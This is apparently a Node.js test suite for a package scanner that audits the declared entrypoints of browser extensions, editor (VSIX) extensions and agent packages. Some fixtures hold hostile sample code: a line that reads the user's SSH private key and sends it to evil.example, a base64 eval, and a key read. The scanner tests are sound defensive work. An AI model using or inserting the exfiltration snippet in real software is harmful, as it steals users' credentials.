"use strict";

const assert = require("node:assert/strict");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");
const test = require("node:test");
const { auditDeclaredSources } = require("../src/distribution/source-audit");

function fixture(t) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "pkgxray-source-audit-"));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  return {
    root,
    put(relative, source) {
      const file = path.join(root, relative);
      fs.mkdirSync(path.dirname(file), { recursive: true });
      fs.writeFileSync(file, source);
    }
  };
}

function browser(root, entrypoints) {
  return { root, families: [{ family: "browser-extension", root, metadata: { name: "fixture" }, entrypoints }] };
}

test("browser declared background code reaches the existing auditor", async t => {
  const f = fixture(t);
  f.put("background.js", "const fs=require('fs'); const x=fs.readFileSync(process.env.HOME+'/.ssh/id_rsa'); require('https').request('https://evil.example').end(x);");
  f.put("unused.js", "eval(Buffer.from('ZXZpbA==','base64').toString())");
  const result = await auditDeclaredSources(browser(f.root, [
    { kind: "background-service-worker", path: "background.js", exists: true, withinRoot: true }
  ]));
  assert.equal(result.verdict, "block");
  assert.deepEqual(result.coverage.selectedEntrypoints, ["background.js"]);
  assert.ok(result.files.includes("background.js"));
  assert.ok(!result.files.includes("unused.js"));
  assert.ok(result.report.findings.some(item => item.file === "background.js"));
});

test("benign browser code completes source coverage while the real auditor preserves metadata review", async t => {
  const f = fixture(t);
  f.put("content.js", "document.documentElement.dataset.ready = 'yes';");
  const result = await auditDeclaredSources(browser(f.root, [
    { kind: "content-script", path: "content.js", exists: true, withinRoot: true }
  ]));
  assert.equal(result.coverage.complete, true);
  assert.equal(result.verdict, "review");
  assert.deepEqual(result.files, ["content.js"]);
  assert.ok(!result.report.findings.some(item => ["medium", "high"].includes(item.severity)));
});

test("nested VSIX entrypoints and their literal imports are scanned", async t => {
  const f = fixture(t);
  f.put("extension/package.json", JSON.stringify({ name: "nested", version: "1.0.0", main: "dist/main.js" }));
  f.put("extension/dist/main.js", "module.exports = require('./helper.js');");
  f.put("extension/dist/helper.js", "const fs=require('fs'); const x=fs.readFileSync(process.env.HOME+'/.ssh/id_rsa'); require('https').request('https://evil.example').end(x);");
  const distribution = { root: f.root, families: [{
    family: "editor-extension", root: f.root, metadata: { name: "nested" },
    entrypoints: [{ kind: "main", path: "dist/main.js", exists: true, withinRoot: true }]
  }] };
  const result = await auditDeclaredSources(distribution);
  assert.ok(result.files.includes("extension/dist/main.js"));
  assert.ok(result.files.includes("extension/dist/helper.js"));
  assert.ok(result.coverage.runtimeFiles.includes("extension/dist/helper.js"));
  assert.equal(result.verdict, "review");
  assert.ok(result.report.findings.some(item => item.file === "extension/dist/helper.js" && item.category === "credential-access"));
});

test("resolved extensionless VSIX entrypoints reach the source auditor", async t => {
  const f = fixture(t);
  f.put("extension/package.json", JSON.stringify({ name: "fixture", publisher: "example", version: "1.0.0" }));
  f.put("extension/dist/extension.js", "require('child_process').exec('echo fixture');");
  const distribution = {
    root: f.root,
    families: [{
      family: "editor-extension",
      metadata: { name: "fixture" },
      entrypoints: [{ kind: "main", declaredPath: "./dist/extension", path: "dist/extension.js", exists: true, withinRoot: true }]
    }]
  };
  const result = await auditDeclaredSources(distribution, { root: f.root });
  assert.ok(result.files.includes("extension/dist/extension.js"));
  assert.equal(result.coverage.selectedEntrypoints.includes("extension/dist/extension.js"), true);
  assert.equal(result.coverage.complete, true);
});

test("descriptor-only and escaped entrypoints never count as a source audit", async t => {
  const f = fixture(t);
  const none = await auditDeclaredSources(browser(f.root, []));
  assert.equal(none.coverage.complete, false);
  assert.equal(none.verdict, "review");
  assert.ok(none.report.findings.some(item => item.category === "missing-evidence"));

  f.put("inside.js", "void 0;");
  const escaped = await auditDeclaredSources(browser(f.root, [
    { kind: "background-script", path: "../outside.js", exists: true, withinRoot: true }
  ]));
  assert.equal(escaped.coverage.complete, false);
  assert.equal(escaped.verdict, "review");
  assert.match(escaped.coverage.reasons.join("\n"), /escapes|not inventoried/);
});

test("source audit never falls back to the process working directory", async () => {
  await assert.rejects(auditDeclaredSources({ families: [] }), /requires a distribution root/);
});

test("source file and byte limits fail visible", async t => {
  const f = fixture(t);
  f.put("main.js", "require('./second.js');");
  f.put("second.js", "module.exports = 1;");
  const distribution = browser(f.root, [{ kind: "background-script", path: "main.js", exists: true, withinRoot: true }]);
  const result = await auditDeclaredSources(distribution, { maxFiles: 1 });
  assert.equal(result.coverage.complete, false);
  assert.equal(result.verdict, "review");
  assert.match(result.coverage.reasons.join("\n"), /file limit/);
});

test("agent package binary paths are audited while command-only launchers remain incomplete", async t => {
  const f = fixture(t);
  f.put("package.json", JSON.stringify({ name: "agent", version: "1.0.0", bin: { agent: "bin/agent.js" } }));
  f.put("bin/agent.js", "const fs=require('fs'); fs.readFileSync(process.env.HOME+'/.ssh/id_rsa');");
  const local = await auditDeclaredSources({ root: f.root, families: [{
    family: "agent-package", root: f.root, metadata: { name: "agent" },
    entrypoints: [{ kind: "binary", name: "agent", path: "bin/agent.js" }]
  }] });
  assert.ok(local.files.includes("bin/agent.js"));
  assert.ok(local.coverage.runtimeFiles.includes("bin/agent.js"));
  assert.ok(local.report.findings.some(item => item.file === "bin/agent.js"));

  const commandOnly = await auditDeclaredSources({ root: f.root, families: [{
    family: "agent-package", root: f.root,
    entrypoints: [{ kind: "command", command: "node", args: ["server.js"] }]
  }] });
  assert.equal(commandOnly.coverage.complete, false);
  assert.match(commandOnly.coverage.reasons.join("\n"), /no readable executable entrypoints|no declared executable files/);
});
